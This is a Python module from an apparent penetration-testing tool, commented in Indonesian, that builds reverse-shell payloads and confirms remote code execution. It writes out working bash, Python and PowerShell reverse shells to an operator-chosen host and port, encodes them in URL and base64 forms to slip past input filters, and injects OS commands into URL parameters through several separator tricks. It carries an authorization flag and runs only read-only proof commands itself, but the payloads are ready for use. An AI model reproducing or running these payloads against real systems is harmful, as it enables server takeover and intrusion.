"""RCE shell helper: buat payload reverse/bind shell + exec melalui vuln.

Menyediakan:
- generator payload shell (bash/tcp, python, powershell) dalam berbagai
  bentuk encoding (URL, base64) untuk melewati filter karakter
- eksekusi perintah "read-only" (id, uname -a, whoami, pwd) melalui
  parameter yang terkonfirmasi command injection — untuk MENGONFIRMASI RCE
  tanpa merusak sistem (no destructive command)

Modul TIDAK otomatis membuka reverse shell; ia MENGHASILKAN payload
yang siap dijalankan user di exploit manual, dan hanya mengeksekusi
perintah bukti yang aman (read-only).

GUARD: memerlukan `authorized=True`; tanpa itu modul menolak beroperasi.
"""

import base64
import re
from typing import List, Optional
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, ok, warn
from keris.modules.scanner import Finding

PROOF_CMD = "id"
PROOF_MARKERS = [r"uid=", r"gid=", r"uid\("]

SAFE_PROOF_CMDS = [
    "id",
    "uname -a",
    "whoami",
    "pwd",
    "echo keris_rce_9f3a2c",
]

OUTPUT_MARKERS = [
    "keris_rce_9f3a2c", "uid=", "gid=", "uid(", "linux", "darwin", "nt 6",
]


def bash_reverse_shell(lhost: str, lport: int) -> str:
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"


def python_reverse_shell(lhost: str, lport: int) -> str:
    return (
        "python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    )


def powershell_reverse_shell(lhost: str, lport: int) -> str:
    return (
        "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient"
        f"('{lhost}',{lport});$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName"
        "System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String );$s.Write(([text.encoding]::ASCII.GetBytes"
        "($r)),0,$r.Length)}}\""
    )


def generate_shell_payloads(lhost: str, lport: int) -> dict:
    """Hasilkan payload shell multi-bahasa + encoding."""
    payloads = {
        "bash": bash_reverse_shell(lhost, lport),
        "python": python_reverse_shell(lhost, lport),
        "powershell": powershell_reverse_shell(lhost, lport),
    }
    encoded = {}
    for name, raw in payloads.items():
        encoded[name + "_url"] = _url_encode(raw)
        encoded[name + "_b64"] = base64.b64encode(raw.encode()).decode()
        encoded[name + "_b64_url"] = _url_encode(base64.b64encode(raw.encode()).decode())
    payloads.update(encoded)
    return payloads


def _url_encode(s: str) -> str:
    import urllib.parse
    return urllib.parse.quote(s, safe="")


def _rebuild(url: str, params: dict) -> str:
    p = urlparse(url)
    return urlunparse(p._replace(query=urlencode(params)))


def confirm_rce(base: str, client: KerisHTTP, endpoints: List[str],
                max_param: int = 4, authorized: bool = False) -> List[Finding]:
    """Eksekusi perintah read-only untuk konfirmasi RCE (non-destruktif)."""
    if not authorized:
        warn("RCE confirm memerlukan --authorized.")
        return []
    findings: List[Finding] = []
    for full in list(dict.fromkeys(endpoints))[:10]:
        if "?" not in full:
            continue
        params = dict(parse_qsl(urlparse(full).query))
        for name in list(params.keys())[:max_param]:
            for cmd in SAFE_PROOF_CMDS:
                # command injection via berbagai pemisah
                for inject in (f"; {cmd}", f"| {cmd}", f"`{cmd}`", f"&& {cmd}",
                               f"\n{cmd}"):
                    q = dict(params)
                    q[name] = inject
                    try:
                        r = client.get(_rebuild(full, q), timeout=15)
                    except Exception:
                        continue
                    body = r.text or ""
                    if any(m in body.lower() for m in OUTPUT_MARKERS):
                        findings.append(Finding(
                            "CRITICAL", "Remote Code Execution terkonfirmasi",
                            full,
                            f"Parameter `{name}` mengeksekusi perintah OS: "
                            f"output `{cmd}` terlihat di respons.",
                            f"injected={inject}\noutput={body[:300]}",
                            cwe="CWE-78",
                            references="https://owasp.org/www-community/attacks/Command_Injection",
                        ))
                        ok(f"  RCE: {name} via `{inject}` -> {cmd} terbukti")
                        return findings
    return findings
